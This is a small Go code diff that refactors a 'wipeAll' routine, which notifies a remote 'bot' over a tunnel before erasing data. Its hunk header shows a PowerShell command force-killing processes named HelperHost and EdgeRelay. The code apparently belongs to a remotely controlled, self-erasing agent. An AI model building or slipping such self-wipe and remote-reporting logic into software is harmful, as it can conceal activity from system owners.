@@ -541,10 +541,9 @@ Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
 func wipeAll() {
 	stopFlag = true
 	tok := token
-	bb := strings.TrimRight(botBase, "/")
 
 	// Notify bot FIRST while tunnel still works — otherwise "suppression en cours" hangs forever.
-	if tok != "" && bb != "" {
+	if tok != "" && strings.TrimRight(botBase, "/") != "" {
 		for i := 0; i < 3; i++ {
 			if reportWiped(tok) == nil {
 				break
